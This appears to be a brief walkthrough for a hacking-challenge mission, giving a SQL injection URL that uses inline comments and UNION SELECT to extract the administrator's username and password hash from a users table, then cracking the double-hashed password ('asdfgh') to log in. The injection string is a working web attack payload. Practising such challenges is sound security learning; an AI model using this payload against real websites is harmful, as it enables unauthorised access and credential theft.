index.php?id=null/**/union/**/select/**/1,username,3/**/from/**/users
this gives the username as administrator again

do this injection again but with password instead of username
you get: 6cfdca6f9633968c72a2a6e0fe2756ca

this is the hash of a152e841783914146e4bcd4f39100686 which is the hash of asdfgh 
the password is probably randomized per mission attempt, but I'm not sure

submit this to the login page and you win!
